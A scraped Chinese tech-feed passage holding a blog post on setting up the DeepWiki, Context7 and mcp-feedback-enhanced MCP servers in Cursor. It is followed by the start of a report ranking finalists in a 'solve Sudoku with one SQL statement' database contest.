<p><code>Devin</code> 官方后来也推出了 <code>deepwiki</code> <code>MCP</code> 服务，这对某些使用开源项目的开发者来说可谓是一个重大利好，相当于免费拥有一个比官方文档更智能，更详细的项目文档。</p>
<p>它可以从 <code>GitHub</code> 仓库或<a href="https://link.juejin.cn?target=deepwiki.com" target="_blank" title="deepwiki.com" ref="nofollow noopener noreferrer"><code>Deepwiki</code></a> 网站获取最新的文档或代码库内容，通过 <code>MCP</code> 协议将爬取的内容转换为 <code>Markdown</code> 格式，供 <code>Cursor</code> 使用，特别适合需要查看 <code>GitHub</code> 仓库文档的场景。</p>
<p><code>DeepWiki</code> <code>MCP</code> 提供三种主要工具：</p>
<ul>
<li><code>read_wiki_structure</code>：获取仓库文档的结构和主题</li>
<li><code>read_wiki_contents</code>：获取仓库文档的详细内容</li>
<li><code>ask_question</code>：对指定仓库提出问题，获取基于仓库文档和代码的 <code>AI</code> 回复</li>
</ul>
<h4 data-id="heading-3">接入</h4>
<p>点开<code>Cursor Settings</code> =&gt; <code>Tools &amp; MCP</code> =&gt; <code>Add a Custom MCP Server</code>，在<code>mcp.json</code>文件中，添加如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"deepwiki"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.deepwiki.com/sse"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-4">如何使用</h4>
<p>使用方法也很简单，直接在 <code>chat</code> 里加上 use <code>deepwiki</code> 和 你想查找的代码库这俩关键字就可以了。比如，如果我想通过 <code>deepwiki</code> 优化 <code>vex-table</code> 中的分页：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f20ec6c2e63246ec9ece519a3c98a174~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=WIFbzshbl8jMQt4Cgu2876Veyl4%3D" alt="image.png" loading="lazy"/></p>
<p>它能够直接分析 <code>vex-table</code> 的官方文档中相关的文档和源码，从而对你的代码做出相应的更改，不用来回切换线上文档和编辑器，大幅度提高编码的准确性和效率。而且由于官方文档一直是最新的，能够有效避免 <code>AI</code> 幻觉问题（目前还是不能完全避免）。相比较之前我们通过<code>@Docs</code> 引入官方文档的做法，<code>Deepwiki</code> <code>MCP</code> 显然更方便和全面。</p>
<h4 data-id="heading-5">使用场景</h4>
<p>我通常会在这几个方面使用它</p>
<ul>
<li>快速查询、使用代码库文档的<code>API</code>。</li>
<li>解决开发过程中遇到的代码库、<code>npm</code> 包相关问题。</li>
<li>快速了解代码库的文档结构</li>
</ul>
<h3 data-id="heading-6">context7</h3>
<h4 data-id="heading-7">简介</h4>
<p><code>Context7</code> <code>MCP</code> 是 <code>upstash</code> 开发的 <code>MCP</code> 工具，它解决了 <code>AI</code> 知识过时造成的<code>AI</code>幻觉问题（<code>AI</code>助手的训练数据可能过时，生成错误或已弃用的代码）。<code>Context7</code>会提供实时、准确的文档，有效减少这类问题。</p>
<p>官方网址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcontext7.com%2F" target="_blank" title="https://context7.com/" ref="nofollow noopener noreferrer">context7.com/</a></p>
<p>它提供了两个工具：</p>
<ol>
<li><code>resolve_library_id</code>: 根据提示词查找库名 <code>ID</code>。</li>
<li><code>get_library_docs</code>: 根据库名 <code>ID</code> 获取库对应的文档内容。</li>
</ol>
<h4 data-id="heading-8">接入</h4>
<p>点开<code>Cursor Settings</code> =&gt; <code>Tools &amp; MCP</code> =&gt; <code>Add a Custom MCP Server</code>，在<code>mcp.json</code>文件中，添加如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"context7"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.context7.com/mcp"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-9">如何使用</h4>
<p>使用方法与 <code>deepwiki</code> 类似，直接在 <code>chat</code> 提示词中加上 <code>use context7</code> 关键字即可。<code>Context7</code> 会自动识别你提到的库或框架，并获取最新的文档和代码示例。</p>
<p>例如，当你想使用最新的 <code>React</code> 18 特性时，可以这样提问：</p>
<blockquote>
<p>"使用 <code>React</code> 18 的新特性创建一个组件，use <code>context7</code>"</p>
</blockquote>
<p>或者想了解某个库的最新 <code>API</code>：</p>
<blockquote>
<p>"如何使用 Next.js 15 的服务器组件？use <code>context7</code>"</p>
</blockquote>
<p><code>Context7</code> 会自动解析你的需求，查找相关的库文档，并获取最新版本的文档内容，确保生成的代码符合最新的 <code>API</code> 和最佳实践。</p>
<h4 data-id="heading-10">使用场景</h4>
<p>我通常会在以下场景使用 <code>Context7</code>：</p>
<ul>
<li><strong>学习新框架或库</strong>：当需要学习新的框架、库或工具时，<code>Context7</code> 可以提供最新的官方文档和代码示例，帮助快速上手</li>
<li><strong>使用新版本特性</strong>：当框架或库发布了新版本，想使用新 <code>API</code> 或特性时，<code>Context7</code> 可以确保获取的是最新版本的文档，避免使用已废弃的 <code>API</code></li>
<li><strong>调试和问题排查</strong>：遇到问题时，<code>Context7</code> 可以获取最新的文档和示例，帮助理解正确的用法和最佳实践</li>
<li><strong>代码重构和优化</strong>：需要重构代码或优化实现时，<code>Context7</code> 可以提供当前版本的最佳实践和推荐模式</li>
</ul>
<h3 data-id="heading-11"><strong><code>Deepwiki</code> 和 <code>Context7</code> 有什么区别</strong></h3>
<p><code>Context7</code> 与 <code>Deepwiki</code> 很像，不过还是有点区别的，根据我对这两个 <code>MCP</code> 的使用过程来看：</p>
<p>如果单论防止 <code>AI</code> 幻觉，<code>Context7</code> 要比 <code>Deepwiki</code> 好点，而且 <code>Context7</code> 可以从不同版本解析代码库。但是如果要论项目的理解深度来说， <code>Deepwiki</code> 要比 <code>Context7</code> 好的多，因为 <code>Deepwiki</code> 是从代码 + 文档角度分析项目的，而 <code>Context7</code> 是从文档角度分析项目。</p>
<p>但是这俩 <code>MCP</code> 都有同一个缺点：搜索的库要么不全，要么特定版本没有。在 <code>Deepwiki</code> 中，一些冷门的库搜索不到， <code>context7</code> 中搜索库，版本可能又不全，比如在<code>context7</code>中搜索 <code>VXE-Table</code>，查到的版本只有两个：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d9212d93b0d4c47ab0cb03aa394c1eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=4Yk5JegYEb6oQhHmP95nqbFHQYU%3D" alt="image.png" loading="lazy"/></p>
<p>遇见这种情况，要么等有人将库传到 <code>Deepwiki</code> 或者 <code>context7</code> 中，要么自己手动去传，我尝试了一下自己去传，速度还是挺快的。</p>
<h3 data-id="heading-12">MCP-Feedback-Enhanced</h3>
<h4 data-id="heading-13">简介</h4>
<p><code>MCP-feedback-enhanced</code> 是一个面向开发者的反馈驱动型工作流工具，核心目标是通过用户反馈优化 <code>AI</code> 操作，减少平台成本并提升开发效率。</p>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMinidoracat%2Fmcp-feedback-enhanced" target="_blank" title="https://github.com/Minidoracat/mcp-feedback-enhanced" ref="nofollow noopener noreferrer">github.com/Minidoracat…</a></p>
<p>直观的说就是，这个工具会让 <code>AI</code> 在完成阶段性任务后，不直接退出，而是先征求开发者意见，根据开发者的反馈，再决定退出还是继续一下步操作。当这个 <code>mcp</code> 被触发时，它会唤起一个基于 <code>Qt GUI</code> 开发的新界面，并提供更为丰富的反馈选项，具体有：</p>
<ul>
<li><code>AI summary</code>：先让 <code>AI</code> 梳理总结一下已经完成的工作，然后用户可以基于此给出反馈。</li>
<li>图像上传：支持 <code>PNG</code>/<code>JPG</code> 等多种格式，并且自动压缩至 <code>1MB</code> 以内，支持拖放和粘贴（<code>Ctrl+V</code>）。</li>
<li>多语言切换：英语、繁简中文，根据系统语言自动切换，支持界面内实时切换。</li>
</ul>
<h4 data-id="heading-14">接入</h4>
<p>点开<code>Cursor Settings</code> =&gt; <code>Tools &amp; MCP</code> =&gt; <code>Add a Custom MCP Server</code>，在<code>mcp.json</code>文件中，添加如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp-feedback-enhanced"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uvx"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"mcp-feedback-enhanced@latest"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"timeout"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"autoApprove"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"interactive_feedback"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-15">如何使用</h4>
<p>与前几个 <code>mcp</code> 一样，直接在 <code>chat</code> 里你的语句加入 use <code>mcp</code>-feedback-enhanced 就行了。
比如，如果我想查询一下这个项目的目录结构：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4797d4b5360247fe8db28085101d9af4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=eV5vOJMkmWXxVEntwtBBehmzJhU%3D" alt="image.png" loading="lazy"/></p>
<p>允许 <code>mcp</code> 调用后，会打开一个 <code>GUI</code> 窗口，可以输入文字。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66c52c452bac40bb940c65856e2b34fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=vsTY1HD6KfbDerMH8SlImdL9Soc%3D" alt="image.png" loading="lazy"/>
比如我们可以输入：只查询 md 文档，</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87c59fd66f8146898988029f9a9e4df2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5Y2D5rWU5ZGA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982298&amp;x-signature=LV1foAzoX6aUTz4ISy5GIBECKgw%3D" alt="image.png" loading="lazy"/></p>
<p>之后提交反馈，他会根据你的反馈再进行解答，解答完后会刷新这个窗口，我们可以再输入反馈，再获得解答....如此循环往复...</p>
<p><strong>注意</strong>： 2024 年的 7 月份，<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fen-US%2Fdocs%2Faccount%2Fpricing" target="_blank" title="https://cursor.com/en-US/docs/account/pricing" ref="nofollow noopener noreferrer">Cursor 的收费方式发生了更改</a>。如果按照之前的依据请求次数收费，我们可以通过调用 <code>mcp-feedback-enhanced</code> 压缩请求次数，通过不断询问用户是否问题已经解决，尽可能将所有更改压缩到一次请求中以减少请求次数。但是由于 <code>Cursor</code> 的收费方式变为现在请求额度收费（其实就是按照输入、输出总的 <code>token</code> 量收费），我们通过延长会话来减少计费次数的想法已经失效。</p>
<p>在新计费模式下，<code>mcp-feedback-enhanced</code> 的主要价值——节省请求次数以节省费用，已经失效。我认为它现在最大的价值应该是：通过交互反馈提高任务完成质量，减少返工，也可以通过这种方式确保 <code>AI</code> 理解需求后再继续，避免方向性错误。</p>
<h4 data-id="heading-16">使用场景</h4>
<p>我通常会在以下场景中使用 <code>MCP-Feedback-Enhanced</code></p>
<ol>
<li>复杂任务的分步确认</li>
<li>需求不明确时的迭代澄清</li>
<li>需要视觉参考的任务（需要大量上传图片、设计稿或者参考图例）</li>
<li>多伦迭代优化</li>
</ol>
<p>简而言之，复杂点的任务用它，简单明确的的任务不用它。</p>
<h3 data-id="heading-17">总结</h3>
<p>其实好用的<code>MCP</code>还有很多，只不过我最喜欢用的是这三个而已，在某些特殊的业务场景下，选用合适的<code>MCP</code>是真能够给你带来事半功倍的效果，比如：</p>
<ol>
<li>如果产品给你的<code>UI</code>是用<code>Figma</code>设计的，那么使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGLips%2FFigma-Context-MCP" target="_blank" title="https://github.com/GLips/Figma-Context-MCP" ref="nofollow noopener noreferrer">Figma-Context-MCP</a>能够帮你快速的将<code>Figma</code>设计稿又快又好的转化为代码。</li>
<li>如果你在开发独立项目，不太会设计，那么<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F21st-dev%2Fmagic-mcp" target="_blank" title="https://github.com/21st-dev/magic-mcp" ref="nofollow noopener noreferrer">magic-mcp</a>会根据你的提示，帮你设计出很好看的<code>UI</code>。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fferrislucas%2Fiterm-mcp" target="_blank" title="https://github.com/ferrislucas/iterm-mcp" ref="nofollow noopener noreferrer">iterm</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foschina%2Fmcp-gitee" target="_blank" title="https://github.com/oschina/mcp-gitee" ref="nofollow noopener noreferrer">gitee</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgithub%2Fgithub-mcp-server" target="_blank" title="https://github.com/github/github-mcp-server" ref="nofollow noopener noreferrer">github</a>等官方也都有自己的<code>MCP</code></li>
<li>...</li>
</ol>
<p>感兴趣的朋友可以去<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.directory%2Fmcp" target="_blank" title="https://cursor.directory/mcp" ref="nofollow noopener noreferrer">这个网站</a>或<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmithery.ai%2F" target="_blank" title="https://smithery.ai/" ref="nofollow noopener noreferrer">这个网站</a>找找看，看哪些<code>MCP</code>对自己的开发有帮助，也可以关注一下<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyzfly%2FAwesome-MCP-ZH" target="_blank" title="https://github.com/yzfly/Awesome-MCP-ZH" ref="nofollow noopener noreferrer">这个 MCP 资源项目</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[第三届数据库编程大赛-八强决赛成绩揭晓]]></title>    <link>https://juejin.cn/post/7595021077665382451</link>    <guid>https://juejin.cn/post/7595021077665382451</guid>    <pubDate>2026-01-14T09:20:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021077665382451" data-draft-id="7595021077665300531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="第三届数据库编程大赛-八强决赛成绩揭晓"/> <meta itemprop="keywords" content="算法,数据库,代码规范"/> <meta itemprop="datePublished" content="2026-01-14T09:20:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NineData"/> <meta itemprop="url" content="https://juejin.cn/user/1684900320129816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            第三届数据库编程大赛-八强决赛成绩揭晓
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1684900320129816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NineData
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:20:12.000Z" title="Wed Jan 14 2026 09:20:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 NineData 第三届数据库编程大赛圆满举办！本次大赛由 NineData 和云数据库技术社区主办，并联合佰晟智算、达梦数据、 ITPUB、CSDN、IFclub、开源中国、DataFun、墨天轮等技术社区共同举办。1 月 12 日晚决赛答辩，超 6 万在线观众围观巅峰对决，八位编程大师过招比拼，最终排名正式揭晓！</p>
<h2 data-id="heading-0">赛题回顾</h2>
<p>本届大赛延续 "一条 SQL" 的核心挑战 <strong>，设置题目为「用一条 SQL」解数独问题</strong>。<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg5NDg3MjQ0NA%3D%3D%26mid%3D2247490402%26idx%3D1%26sn%3D134d098a24b05c163653b7deab0f61d6%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg5NDg3MjQ0NA==&amp;mid=2247490402&amp;idx=1&amp;sn=134d098a24b05c163653b7deab0f61d6&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">查看赛题详情</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzg5NDg3MjQ0NA%3D%3D%26mid%3D2247490402%26idx%3D1%26sn%3D134d098a24b05c163653b7deab0f61d6%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=Mzg5NDg3MjQ0NA==&amp;mid=2247490402&amp;idx=1&amp;sn=134d098a24b05c163653b7deab0f61d6&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"/></p>
<p>本次大赛的评委，均是数据库领域的领军人物，通过主办方 NineData 的邀请，组成2025年《第三届数据库编程大赛》强大的评审嘉宾团。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/424f83eb84624292bfae21cd505afeb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=HurPcwI%2BmXXj2P%2BWfEVEvHCpPz0%3D" alt="图片" loading="lazy"/></p>
<p>《第三届数据库编程大赛》评审嘉宾团在将近两周的赛程报名中，共有数百位数据库爱好者积极参与。以下是本次入围决赛的前 8 强选手决赛最终排名：</p>
<h2 data-id="heading-1">八强SQL编程大师诞生</h2>
<p>经过大赛组委会对参赛数百份 SQL 代码的初步验证和确认，确保其正确性。在接下来的百万级别性能评测中，我们选出了最强的8位选手，成功晋级到决赛答辩环节。本次大赛由 5 位权威评委+ AI 评委组成的专家团队，对选手的 SQL 参赛代码和答辩解读进行评分。评委们将着重考察代码的创新性和易读性，并将分别对这两个方面进行打分。最终，大赛组委会将根据综合得分，确定选手的最终排名。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf717aef686b46d88c94107b8e68d957~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=QuHu5p72FcyXbrHl7cRvuqKLjDM%3D" alt="图片" loading="lazy"/></p>
<p>👇👇以下是本次大赛 8 位选手简介和 SQL 说明概要：</p>
<h2 data-id="heading-2">第8名：郑毅</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e07fb3441da147228fcec93622b6e28d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=WQJYqh9V18ll1SXuOX7O9P%2BYGuc%3D" alt="图片" loading="lazy"/></p>
<p><strong>参赛选手</strong>：郑毅</p>
<p><strong>个人简介</strong>：数据库新手，从事算法工作</p>
<p><strong>参赛数据库</strong>：PostgreSQL</p>
<p><strong>性能评测</strong>：1万级数据代码性能评测 14.448 秒</p>
<p><strong>综合得分</strong>：67.3以下是郑毅的代码说明思路：</p>
<p>SQL 代码通过<strong>三步核心逻辑</strong>实现数独自动化求解，核心是利用递归 CTE 完成深度优先搜索（DFS），同时兼顾求解效率和结果格式：</p>
<ol>
<li><strong>预处理筛选</strong>先清理数独题目字符串（移除空白，转为 81 字符紧凑格式），计算待填空格数，仅保留空格数≤50 的简单题目（降低求解复杂度），按空格数（难度）和 ID 排序后取前 10000 行；</li>
<li><strong>递归回溯求解</strong>以递归 CTE 实现 DFS，从第一个待填位置（?）开始，尝试填入 1-9 的数字，实时校验行、列、3×3 宫的唯一性（不重复则保留，否则剪枝），满足约束则继续填充下一个空格，直至无待填位置（pos=0）即得到解，且通过<code>DISTINCT ON (id)</code>确保每个题目仅返回首个有效解；</li>
<li><strong>格式化输出</strong>将 81 字符的解字符串按每 9 字符切分并插入换行符，还原为标准 9 行数独格式，通过左连接和 ID 排序，保证输出顺序与原题目一致（未解出的题目也保留）。</li>
</ol>
<h2 data-id="heading-3">第7名：吴斯琪</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7958e255766e4edd9f547daa5b985257~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmluZURhdGE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768987212&amp;x-signature=qfwi%2F8HnH0xgId9E25pet%2BPImQs%3D" alt="图片" loading="lazy"/></p>
<p><strong><strong>参赛选手</strong></strong>：吴斯琪</p>
<p><strong>个人简介</strong>：吴斯琪，参赛昵称吴忌，来自广东交通集团，从事IT系统运维多年。</p>
<p><strong>参赛数据库</strong>：MySQL</p>
<p><strong>性能评测</strong>：1 万级数据代码性能评测 21.565 秒</p>
<p><strong>综合得分</strong>：79.1</p>
<p>以下是吴忌选手的代码说明思路简介：</p>
<p>代码核心逻辑是依托递归模拟回溯算法，结合位运算优化状态存储，采用MRV（最小剩余值）启发式搜索算法，有效减少搜索分支。整体思路可分为四步核心逻辑：</p>
<h5 data-id="heading-4">1. 预处理：构建基础计算维度</h5>
<p>先生成数独求解的基础数据 —— 数字 1-9（用于填充尝试）、81 个格子的行列宫坐标；同时通过高低位偏移量设计，解决 64 位整数存储 9 行 ×9 位（81 位）约束信息的溢出问题，为后续位运算铺路。</p>
<h5 data-id="heading-5">2. 初始化：位掩码压缩存储初始状态</h5>
<p>将输入的 81 字符数独字符串清洗后，通过位运算构建 6 个 64 位整数掩码（行 / 列 / 宫的高低位掩码、已填位置掩码），把 “某行 / 列 / 宫已占用的数字”“棋盘已填位置” 等约束信息压缩存储，这是整个求解器的核心状态表示方式。</p>
<h5 data-id="heading-6">3. 递归求解：DFS+MRV 启发式回溯（核心）</h5>
<p>以递归 CTE 实现深度优先搜索，核心优化是 MRV 启发式策略：</p>
<ul>
